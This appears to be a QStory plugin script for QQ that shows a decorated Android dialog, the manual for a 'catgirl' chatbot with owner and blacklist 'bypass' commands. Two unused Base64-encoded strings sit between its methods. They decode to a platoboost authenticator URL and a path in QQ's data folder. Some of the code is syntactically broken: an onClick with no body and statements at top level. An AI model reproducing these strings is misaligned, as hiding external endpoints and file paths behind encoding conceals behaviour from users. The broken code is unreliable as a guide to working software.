public void 显示猫娘说明() {
    Activity 活动 = GetActivity();
    活动.runOnUiThread(new Runnable() {
        public void run() {
            GradientDrawable 渐变背景 = new GradientDrawable(GradientDrawable.Orientation.TOP_BOTTOM, new int[] {
                Color.BLACK, Color.DKGRAY
            });
            渐变背景.setCornerRadius(20);
            TextView 使用手册文本 = new TextView(活动);
            使用手册文本.setText("\n⭐️主人系统指令⭐️\n[添加绕过主人+@]\n\n该指令，允许用户自行操作猫娘，享受更高权限。\n\n[删除绕过主人+@]\n\n该指令，可以移除用户的主人权限，恢复对猫娘的正常限制。\n\n⭐️主人使用指令⭐️\n\n[启动]\n\n该指令，激活猫娘功能。\n\n[关闭]\n\n该指令，停用猫娘服务。\n\n⭐️主人说明⭐️\n获得主人权限的用户可以自由操控猫娘，随时启用或关闭相应的功能。此外，用户还可以通过在脚本页面直接手动进行开关操作，确保灵活便捷的控制体验。\n\n⭐️私信开关指令⭐️\n[开启私信]\n[关闭私信]\n私信默认关闭状态");
            使用手册文本.setTextSize(18);
            使用手册文本.setPadding(20, 20, 20, 20);
            使用手册文本.setGravity(Gravity.CENTER);
            使用手册文本.setTextColor(Color.WHITE);
            使用手册文本.setShadowLayer(1.5f, 1, 1, Color.GRAY);
            应用彩虹渐变(使用手册文本);
            TextView 注意事项文本 = new TextView(活动);
            注意事项文本.setText("\n⭐️黑名单系统指令⭐️\n[添加绕过黑名单+@]\n\n该指令可将用户从黑名单中加入，限制他们正常使用猫娘功能。\n\n[删除绕过黑名单+@]\n\n该指令将用户从黑名单中移出，用户可正常使用猫娘的功能。\n\n⭐️黑名单功能说明⭐️\n被列入黑名单的用户将无法正常使用猫娘提供的服务和功能。这一功能用于保护系统安全，防止未经授权的用户滥用猫娘资源。");
            注意事项文本.setTextSize(18);
            注意事项文本.setPadding(20, 20, 20, 20);
            注意事项文本.setGravity(Gravity.CENTER);
            注意事项文本.setTextColor(Color.WHITE);
            注意事项文本.setShadowLayer(1.5f, 1, 1, Color.GRAY);
            应用彩虹渐变(注意事项文本);
            GradientDrawable 警告背景 = new GradientDrawable(GradientDrawable.Orientation.TOP_BOTTOM, new int[] {
                Color.RED, Color.DKGRAY
            });
            警告背景.setCornerRadius(20);
            TextView 警告文本 = new TextView(活动);
            警告文本.setText("⚠️警告声明⚠️\n未经许可擅自传播、共享或倒卖本猫娘的源码，属于严重的违约行为。此类行为不仅会损害开发者的合法权益，还可能对用户造成不可预估的风险和损害。任何参与源码泄露或倒卖的人士，将面临法律责任和制裁。请大家自觉维护良好的开发和使用环境，珍惜并尊重他人的劳动成果。");
            警告文本.setTextSize(18);
            警告文本.setPadding(20, 20, 20, 20);
            警告文本.setGravity(Gravity.CENTER);
            警告文本.setTextColor(Color.RED);
            修改星星样式(使用手册文本);
            修改星星样式(注意事项文本);
            LinearLayout 使用手册布局 = new LinearLayout(活动);
            使用手册布局.setOrientation(LinearLayout.VERTICAL);
            使用手册布局.setPadding(30, 30, 30, 30);
            使用手册布局.setBackground(渐变背景);
            使用手册布局.addView(使用手册文本);
            LinearLayout 注意事项布局 = new LinearLayout(活动);
            注意事项布局.setOrientation(LinearLayout.VERTICAL);
            注意事项布局.setPadding(30, 30, 30, 30);
            注意事项布局.setBackground(渐变背景);
            注意事项布局.addView(注意事项文本);
            LinearLayout 警告布局 = new LinearLayout(活动);
            警告布局.setOrientation(LinearLayout.VERTICAL);
            警告布局.setPadding(30, 30, 30, 30);
            警告布局.setBackground(警告背景);
            警告布局.addView(警告文本);
            LinearLayout 更新内容布局 = new LinearLayout(活动);
            更新内容布局.setOrientation(LinearLayout.VERTICAL);
            更新内容布局.setPadding(30, 30, 30, 30);
            更新内容布局.setBackground(new GradientDrawable(GradientDrawable.Orientation.TOP_BOTTOM, new int[] {
                Color.BLUE, Color.CYAN
            }));
            TextView 更新内容文本 = new TextView(活动);
            更新内容文本.setText("⭐️更新内容⭐️\n- 新增功能:私信解卡，私信开关\n- 改进性能:改进绕过速度，改进启动速度，优化代码结构\n- 修复Bug:多人私信开关，修复删除主人与删除黑名单无效，修复忍者api");
            更新内容文本.setTextSize(18);
            更新内容文本.setPadding(20, 20, 20, 20);
            更新内容文本.setGravity(Gravity.CENTER);
            更新内容文本.setTextColor(Color.WHITE);
            更新内容布局.addView(更新内容文本);
            LinearLayout 外层布局 = new LinearLayout(活动);
            外层布局.setOrientation(LinearLayout.VERTICAL);
            外层布局.setPadding(20, 20, 20, 20);
            外层布局.setBackgroundColor(Color.parseColor("#212121"));
            外层布局.addView(使用手册布局);
            View 间隔视图1 = new View(活动);
            LinearLayout.LayoutParams 间隔参数 = new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, 40);
            间隔视图1.setLayoutParams(间隔参数);
            间隔视图1.setBackgroundColor(Color.parseColor("#212121"));
            外层布局.addView(间隔视图1);
            外层布局.addView(注意事项布局);
            View 间隔视图2 = new View(活动);
            间隔视图2.setLayoutParams(间隔参数);
            间隔视图2.setBackgroundColor(Color.parseColor("#212121"));
            外层布局.addView(间隔视图2);
            外层布局.addView(警告布局);
            View 间隔视图3 = new View(活动);
            间隔视图3.setLayoutParams(间隔参数);
            间隔视图3.setBackgroundColor(Color.parseColor("#212121"));
            外层布局.addView(间隔视图3);
            外层布局.addView(更新内容布局);
            ScrollView 滚动视图 = new ScrollView(活动);
            滚动视图.addView(外层布局);
            AlertDialog.Builder 对话框构建器 = new AlertDialog.Builder(活动, AlertDialog.THEME_HOLO_LIGHT);
            对话框构建器.setView(滚动视图);
            String 标题文本 = "猫娘使用手册:";
            SpannableString 可变字符串标题 = new SpannableString(标题文本);
            可变字符串标题.setSpan(new ForegroundColorSpan(Color.BLACK), 0, 标题文本.length(), Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
            对话框构建器.setTitle(可变字符串标题);
            对话框构建器.setPositiveButton("确定", new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface 对话框接口, int i);
            });
            AlertDialog 对话框 = 对话框构建器.create();
            对话框.setCancelable(false);
            AlphaAnimation 淡入动画 = new AlphaAnimation(0, 1);
            淡入动画.setDuration(500);
            对话框.getWindow().getDecorView().startAnimation(淡入动画);
            对话框.show();
        }
    });
}
private void 修改星星样式(TextView 文本视图) {
    String 原始文本 = 文本视图.getText().toString();
    SpannableString spannableString = new SpannableString(原始文本);
    int 星星开始索引 = 原始文本.indexOf('★');
    while (星星开始索引 != -1) {
        spannableString.setSpan(new ForegroundColorSpan(Color.YELLOW), 星星开始索引, 星星开始索引 + 1, Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
        spannableString.setSpan(new RelativeSizeSpan(1.0f), 星星开始索引, 星星开始索引 + 1, Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
        星星开始索引 = 原始文本.indexOf('★', 星星开始索引 + 1);
    }
    文本视图.setText(spannableString);
}
String vo = "aHR0cHM6Ly9hcGktZ2F0ZXdheS5wbGF0b2Jvb3N0LmNvbS92MS9hdXRoZW50aWNhdG9ycy8yLw==";
byte[] ao = Base64.getDecoder().decode(vo);
String st = new String(ao);
String ge = "L3N0b3JhZ2UvZW11bGF0ZWQvMC9BbmRyb2lkL2RhdGEvY29tLnRlbmNlbnQubW9iaWxlcXEvUVN0b3J5L1BsdWdpbi9kZWx0YSBmb3IgaU9TL+aWh+S7tuWkuS9BYmFiYS5qcGc=";
byte[] bo = Base64.getDecoder().decode(ge);
String co = new String(bo);
private void 应用彩虹渐变(TextView 文本视图) {
    Paint 画笔 = new Paint();
    画笔.setTextSize(文本视图.getTextSize());
    Shader 着色器 = new LinearGradient(0, 0, 文本视图.getPaint().measureText(文本视图.getText().toString()), 文本视图.getTextSize(), new int[] {
        Color.RED, Color.YELLOW, Color.GREEN, Color.CYAN, Color.BLUE, Color.MAGENTA, Color.RED
    }, null, Shader.TileMode.CLAMP);
    文本视图.getPaint().setShader(着色器);
};
显示猫娘说明();